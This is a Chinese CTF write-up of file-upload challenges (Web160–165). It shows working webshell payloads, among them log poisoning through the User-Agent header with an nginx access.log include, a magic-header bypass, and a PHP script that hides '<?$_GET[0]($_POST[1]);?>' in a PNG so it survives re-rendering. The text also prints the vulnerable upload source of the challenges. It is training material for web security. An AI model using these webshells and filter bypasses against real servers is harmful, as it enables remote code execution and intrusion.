<p>在php代码的进行过程中，遇到include函数就去跳转到包含的文件中进行读取，并显示在输出中，如果是php代码，会自动解析，如果不是，则单纯以文本的方式显示，示例如下：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/6b/ad/PplCcQEg_o.png" alt="image-20240216004917491"></p> 
<p>然后回到这个题目中我们发现，反引号和空格全部被过滤了，通过单一的上传时无法实现的，所以我们采用对日志的利用。</p> 
<p>那么日志记录的是什么呢，查看了一下本地的<code>access.log</code>文件</p> 
<p><img src="https://images2.imgbox.com/a8/7c/6zoqAVHk_o.png" alt="image-20240216005633283"></p> 
<p>发现记录的有User-Agent字段里面的内容</p> 
<p>所以我们把一句话木马放到User-Agent字段中进行写入到日志中，然后通过include的函数，触发解析日志中的一句话木马</p> 
<p><img src="https://images2.imgbox.com/17/b4/H3NieVz3_o.png" alt="image-20240216023431484"></p> 
<p><img src="https://images2.imgbox.com/0d/d5/7BXhlnLd_o.png" alt="image-20240216010037299"></p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/l"</span><span class="token operator">.</span><span class="token string double-quoted-string">"og/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>到此成功上传png文件，但是请注意两点，一个是对log有过滤，对于字符串的过滤我们将他隔开即可</p> 
<p>第二个是需要作为php语句进行解析，所以还是需要使用<code>.user.ini</code></p> 
<p><img src="https://images2.imgbox.com/00/76/J7nxicaW_o.png" alt="image-20240216010215471"></p> 
<p>然后进行触发</p> 
<p><img src="https://images2.imgbox.com/2d/68/nOgXGDQ3_o.png" alt="image-20240216010244929"></p> 
<p>进行连接，注意两点，一是url要加头，二是连到<code>index.php</code></p> 
<p><img src="https://images2.imgbox.com/69/ce/iWoJXvR6_o.png" alt="image-20240216010656445"></p> 
<p>源码一贴，学习一下验证思想：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-24 19:34:52
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-26 15:49:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">&gt;</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    	<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件超过1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token operator">!=</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    		
    	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    		<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token punctuation">}</span>
    	
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\{|\[|\;|log|\(| |\`/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h4><a id="Web161_482"></a>Web161</h4> 
<h5><a id="_484"></a>考点：文件头检测</h5> 
<h5><a id="_486"></a>解题：</h5> 
<p>上题的payload上传失败</p> 
<p>给png添加幻术，加文件头<code>GIF89a?</code></p> 
<p><img src="https://images2.imgbox.com/a8/90/S2kmvMqC_o.png" alt="image-20240216025716275"></p> 
<p><img src="https://images2.imgbox.com/a0/4d/3CjP2eST_o.png" alt="image-20240216025051632"></p> 
<p>贴一下源码，与上题对比去看看文件头的检测机制：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-24 19:34:52
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-26 15:49:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">&gt;</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    	<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件超过1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token operator">!=</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    		
    	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    		<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	<span class="token punctuation">}</span>
    	
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|\{|\[|\;|log|\(| |\`/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> 
<p>找到检测中的区别：</p> 
<pre><code class="prism language-php"><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span>
</code></pre> 
<p>It is using the <code>getimagesize</code> function to retrieve information about an uploaded image file.</p> 
<pre><code class="prism language-php"><span class="token variable">$imageInfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageInfo</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$width</span> <span class="token operator">=</span> <span class="token variable">$imageInfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$height</span> <span class="token operator">=</span> <span class="token variable">$imageInfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mime</span> <span class="token operator">=</span> <span class="token variable">$imageInfo</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mime"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Image width: "</span> <span class="token operator">.</span> <span class="token variable">$width</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" pixels&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Image height: "</span> <span class="token operator">.</span> <span class="token variable">$height</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" pixels&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Image MIME type: "</span> <span class="token operator">.</span> <span class="token variable">$mime</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid image file"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>This code retrieves the width, height, and <mark>MIME</mark> type of the uploaded image and displays them as output.</p> 
<p>因为检测MIME，所以需要添加文件头</p> 
<h4><a id="Web162_581"></a>Web162</h4> 
<h4><a id="Web164_591"></a>Web164</h4> 
<h5><a id="PNG_593"></a>考点：PNG图片二次渲染</h5> 
<p>这个题目奇奇怪怪的很多坑哟</p> 
<p>经过测试 只允许上传png</p> 
<p>直接上传一个我们普通的假的png木马图片 不会成功</p> 
<p><img src="https://images2.imgbox.com/6c/25/0omXVJst_o.png" alt="image-20240531155954231"></p> 
<p>上传普通的木马图片 比如在尾部的木马 会被经过二次渲染而清除</p> 
<p>上传用脚本生成木马图片</p> 
<p><img src="https://images2.imgbox.com/61/b3/BQ6iPpOf_o.png" alt="image-20240531160030255"></p> 
<p>成功上传</p> 
<p>这个图片的生成方式如下：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
             <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
             <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
             <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
             <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
             <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
             <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
             <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>对应的木马内容：<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code></p> 
<p>上传后直接点击查看图片</p> 
<p><img src="https://images2.imgbox.com/e4/b4/jEHZr3kO_o.png" alt="image-20240531160328142"></p> 
<p>然后进行传参</p> 
<p><img src="https://images2.imgbox.com/b7/cd/Uc7ifuap_o.png" alt="image-20240531160345495"></p> 
<p>会显示看不了，你以为失败了吗 其实并没有，这个时候CtrlS 保存图片 然后改成txt文本查看 就会发现 flag已经在图片里面了</p> 
<p><img src="https://images2.imgbox.com/7d/3b/rFHmmy5I_o.png" alt="image-20240531160643475"></p> 
<p>之所以在图片里面 感觉是因为二次渲染的功效吧</p> 
<h4><a id="Web165_660"></a>Web165</h4> 
<h5><a id="JPG_662"></a>考点：JPG图片二次渲染</h5> 
<p>开题之后 png也上传不了</p> 
<p>测试后发现只能上传jpg文件</p> 
<p>目前遇到两个坑</p> 
<ol><li>上传后查看图片无法抓包</li><li>大爹脚本无法对下载后的图片进行渲染绕过 始终报错somethingwrong</li></ol> 
